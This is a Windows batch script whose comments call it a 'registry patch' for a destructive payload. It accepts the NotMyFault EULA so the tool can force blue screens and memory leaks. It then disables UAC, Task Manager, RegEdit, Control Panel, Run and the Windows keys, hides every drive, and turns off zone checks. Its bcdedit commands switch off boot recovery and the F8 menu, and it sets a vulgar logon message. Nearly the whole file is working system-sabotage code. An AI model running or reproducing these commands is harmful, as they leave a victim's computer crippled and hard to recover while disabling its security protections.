:: Registry patch, compiled from various other stuffs
@echo off
exit
::comment out exit when compiling
:: Since NotMyFault has no automatic EULA accepting parameter, it's added here instead
:: NMF is used to trigger BSOD and hang, as well as memory leak payload, which is required to slow the computer down and/or crash
:: tl;dr: It's a cheap way to fuck up the system to the degree no security software can handle the failure
reg add HKCU\Software\Sysinternals\NotMyFault /v EulaAccepted /t REG_DWORD /d "1" /f
:: Disable UAC
reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /d "0" /f
:: Disable Find option
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies /v NoFind /t REG_DWORD /d "1" /f
:: No display control panel
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoDispCPL /t REG_DWORD /d "1" /f
:: Disable folder options
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoFolderOptions /t REG_DWORD /d "1" /f
:: Disable control panel
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoControlPanel /t REG_DWORD /d "1" /f
:: Goodbye Task Manager
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d "1" /f
:: No RegEdit
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d "1" /f
:: No Run Option
REG add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRun /t REG_DWORD /d "1" /f
:: Hide all drives
REG add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDrives /t REG_DWORD /d "0x3FFFFFF" /f
:: Disable Zone Check
REG ADD "HKCU\Environment" /V SEE_MASK_NOZONECHECKS /T REG_SZ /D 1 /F
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /V SEE_MASK_NOZONECHECKS /T REG_SZ /D 1 /F
:: Replace current shell with something else, if it decides to work...
::reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_DWORD /d "C:\system\exploder.exe"
:: Disable boot options and stuff, no F8 boot menu can be shown
bcdedit /set {current} bootems off
bcdedit /set {current} advancedoptions off
bcdedit /set {current} optionsedit off
bcdedit /set {current} bootstatuspolicy IgnoreAllFailures
bcdedit /set {current} recoveryenabled off
:: Add some "nice" messages to the startup screen
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v legalnoticecaption /t REG_SZ /d "WARNING" /f
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v legalnoticetext /t REG_SZ /d "Your dick is so tiny it's going minus scale, thus creating inverse penis!" /f
:: Disable all Win+X shortcuts
REG add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoWinKeys /t REG_DWORD /d "1" /f
:: Remove all balloon notification
REG add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v EnableBalloonTips /t REG_DWORD /d "0" /f
:: Supposed to activate the registry changes
RUNDLL32.EXE USER32.DLL, UpdatePerUserSystemParameters, 1, True